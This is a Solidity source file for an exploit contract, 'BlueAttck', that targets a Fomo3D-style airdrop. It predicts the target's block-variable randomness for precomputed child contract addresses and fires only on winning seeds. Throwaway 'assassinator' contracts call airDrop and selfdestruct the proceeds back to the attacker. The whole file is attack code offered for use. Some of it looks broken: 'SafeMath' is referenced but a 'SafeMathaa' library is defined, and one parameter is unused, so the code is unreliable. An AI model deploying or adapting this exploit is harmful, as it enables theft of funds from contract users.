pragma solidity ^0.4.24;

/**
 * @title Owned
 * @dev Ownership model
 */
contract Owned {
	address public owner;

	event OwnershipTransfered(address indexed owner);

	constructor() public {
		owner = msg.sender;
	}

	modifier onlyOwner {
		require(msg.sender == owner);
		_;
	}

	function transferOwnership(address newOwner) onlyOwner public {
		owner = newOwner;
		emit OwnershipTransfered(owner);
	}
}

contract Fake3D{
    function airDrop() public returns (bool) {}
}

contract assassinator {
	function assassinator(address beneficiary, address target, address hack_addr) public payable {
		Fake3D ag = Fake3D(target);
		ag.airDrop();
		selfdestruct(beneficiary);
	}
}

contract executor {
	function attack(uint256 _eth, address target, address hack_addr) public payable {
		assassinator ass = (new assassinator).value(_eth)(msg.sender, target, hack_addr);
	}
}

contract BlueAttck is Owned{
    
	using SafeMath for *;
	struct child {
		address addr;
		uint64	nonce;
	}

	child[] 	public children;
	address 	public target;
	address public hack_addr = 0xca35b7d915458ef540ade6068dfe2f44e8fa733c;
	
	event Log(address addr);
	event Exe(address addr,uint n);

	function test_create() public {
		emit Log(ContractAddrCalculator.calc(this, 1));
		executor e = new executor();
		emit Log(e);
	}

	
	function claim_airdrop(uint times) public{
	    Fake3D ag = Fake3D(target);
		    for(uint i = 0; i < children.length; i++) {
			    child storage ch = children[i];
			    address _sender = ContractAddrCalculator.calc(ch.addr, ch.nonce);
			
			    uint256 seed = uint256(keccak256(abi.encodePacked(
                    (block.timestamp).add
                    (block.difficulty).add
                    ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add
                    (block.gaslimit).add
                    ((uint256(keccak256(abi.encodePacked(_sender)))) / (now)).add
                    (block.number)
                    )));
                
                if((seed - ((seed / 1000) * 1000)) < 288){
                    for(uint j=0;j<times;j++){
                    executor(ch.addr).attack.value(msg.value)(msg.value, ag, hack_addr);
                    emit Exe(_sender,ch.nonce);
                    }
                }
		    }
	}
	
	function set_target(address _addr)	onlyOwner public
	{
		target = _addr;
	}

	function prepare(uint j) onlyOwner public {
		for(uint i = 0; i < j; i++) {
			children.push(child(new executor(), 1));
		}
	}
}




/**
 * @title SafeMath v0.1.9
 * @dev Math operations with safety checks that throw on error
 * change notes:  original SafeMath library from OpenZeppelin modified by Inventor
 * - added sqrt
 * - added sq
 * - added pwr 
 * - changed asserts to requires with error log outputs
 * - removed div, its useless
 */
library SafeMathaa {

	/**
	 * @dev Multiplies two numbers, throws on overflow.
	 */
	function mul(uint256 a, uint256 b) 
		internal 
		pure 
		returns (uint256 c) 
		{
			if (a == 0) {
				return 0;
			}
			c = a * b;
			require(c / a == b, "SafeMath mul failed");
			return c;
		}
	/**
	 * @dev Adds two numbers, throws on overflow.
	 */
	function add(uint256 a, uint256 b)
		internal
		pure
		returns (uint256 c) 
		{
			c = a + b;
			require(c >= a, "SafeMath add failed");
			return c;
		}
}

library ContractAddrCalculator {
	// NOTE this program works as long as nonce is less than 33 bytes
	// which is 2**(8*33), almost impossible for a contract to create
	// so many contracts, also uint256 is only 32bytes
	// GAS COST
	// nonce = 1 => 256
	//         0x80 => 389
	//         0x0102 => 429
	// above is example of assembly execution cost, plus 280 other execution cost per tx
	// complaint: 1. the compiler's control flow analysis sucks
	//            2. no opcode for left/right shift, has to use a combination of exp and mul, causes a lot more gas usage
	function calc(address baseAddr, uint256 nonce) public view returns(address addr) {
		assembly {
			// ---------------START: genAddr---------------
			// TODO: load from parameters
			// A N
			baseAddr  // dup3
			nonce     // dup3

			// ---------------START: rlpEncodeNonce---------------
			// N
			dup1
			dup1 // to fix the compiler bug on stack height calc around "jump" opcode, have to manually maintain the stack height
			label_not0
			// N N N label_not0
			jumpi
			pop
			pop
			0x80
			1
			// 0x80 1
			label_rlpEnd
			// 0x80 1 label_rlpEnd
			jump
			label_not0:
			// N N
			dup1
			0x7f
			lt
			// N N N>0x7f
			label_rlpGt0x7f
			jumpi
			// N N
			pop
			1
			label_rlpEnd
			// N 1 label_rlpEnd
			jump
			label_rlpGt0x7f:
			// N N
			pop

			// ---------------START: countStackTopInBytes---------------
			// push the integer represents the byte count of stack-top number on to stak
			// example with STACK
			// 0x00 => 0x00 0x01
			// 0xf0 => 0xf0 0x01
			// 0x0102 => 0x0102 0x02
			// X
			0
			// X 0
			dup2
			// X 0 X
			label_loop:
			swap1
			// X X 0
			1
			add
			// X X 1
			swap1
			// X 1 X
			256
			// X 1 X 256
			swap1
			// X 1 256 X
			div
			// X 1 X>>8
			dup1
			// X 1 X>>8 X>>8
			label_loop
			// X 1 X>>8 X>>8 label_loop
			jumpi
			// X 1 X>>8
			pop
			// X 1
			// ---------------END: countStackTopInBytes---------------

			// N N_len
			swap1
			// N_len N
			dup2
			// N_len N N_len
			dup1
			0x80
			add
			// N_len N N_len rlpNHead
			swap1
			// N_len N rlpNHead N_len
			256
			exp
			// N_len N rlpNHead 256^N_len
			mul
			or
			// N_len rlpN
			swap1
			// rlpN N_len
			1
			add
			// rlpN rlpN_byte_length(N_len + 1)
			label_rlpEnd:
			// rlpN rlpN_byte_length
			// ---------------END: rlpEncodeNonce---------------

			// A rlpN rlpN_len
			dup1
			// A rlpN rlpN_len rlpN_len
			22
			add
			// A rlpN rlpN_len rlp_total_len
			swap3
			// rlp_total_len rlpN rlpN_len A
			dup2
			// rlp_total_len rlpN rlpN_len A rlpN_len
			0xd5 // 0xd5 = 0xc0 + 21(the byte length of address rlp encoding)
			// rlp_total_len rlpN rlpN_len A rlpN_len 0xd5
			add
			// rlp_total_len rlpN rlpN_len A rlp_head
			0x0100
			mul
			// rlp_total_len rlpN rlpN_len A rlp_head<<8
			0x94 // 0x94 = 0x80 + 20
			or
			// rlp_total_len rlpN rlpN_len A rlp_head.0x94
			0x010000000000000000000000000000000000000000
			mul
			// rlp_total_len rlpN rlpN_len A rlp_head.0x94<<20bytes
			or
			// rlp_total_len rlpN rlpN_len rlp_head.rlpA
			swap1
			// rlp_total_len rlpN rlp_head.rlpA rlpN_len
			256
			exp
			// rlp_total_len rlpN rlp_head.rlpA 256^rlpN_len
			mul
			or
			// rlp_total_len rlp_head.rlpA.rlpN
			dup2
			0x80
			add
			// rlp_total_len rlp_head.rlpA.rlpN rlp_total_len+0x80
			mstore
			// rlp_total_len
			// memory 0xa0: rlp_head.rlpA.rlpN
			0xa0
			sha3
			// sha3_rlp
			0xffffffffffffffffffffffffffffffffffffffff
			and
			// sha3_rlp(last 20bytes)
			=:addr  // equivalent to swap1 pop
			// ---------------END: genAddr---------------
		}
	}
}